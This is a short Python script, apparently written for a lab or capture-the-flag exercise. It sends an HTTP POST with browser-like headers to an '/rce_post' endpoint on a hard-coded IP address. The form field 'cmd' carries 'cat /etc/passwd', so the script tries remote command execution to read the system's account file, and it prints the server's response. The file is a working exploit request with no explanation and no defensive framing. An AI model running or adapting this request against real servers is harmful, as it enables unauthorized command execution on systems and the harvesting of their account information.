'''
Description: 
Autor: Yue
Date: 2024-09-22 19:28:56
LastEditors: Yue
LastEditTime: 2024-09-22 19:40:40
'''
import requests
headers = {
 'Host': '101.91.208.121:9003',
 # 'Content-Length': '23',
 'Cache-Control': 'max-age=0',
 'Upgrade-Insecure-Requests': '1',
 'Origin': 'http://101.91.208.121:9001',
 'Content-Type': 'application/x-www-form-urlencoded',
#  'Content-Type': 'application/x-www-form-urlencoded',
 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
 'Accept':
'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/sig'
'ned-exchange;v=b3;q=0.7',
 'Referer': 'http://101.91.208.121:9001/',
 # 'Accept-Encoding': 'gzip, deflate, br',
 'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,vi;q=0.7',
 'Connection': 'close',
}
data = {
 'cmd': 'cat /etc/passwd',
}
response = requests.post('http://101.91.208.121:9003/rce_post', headers=headers, data=data, verify=False)
print(response)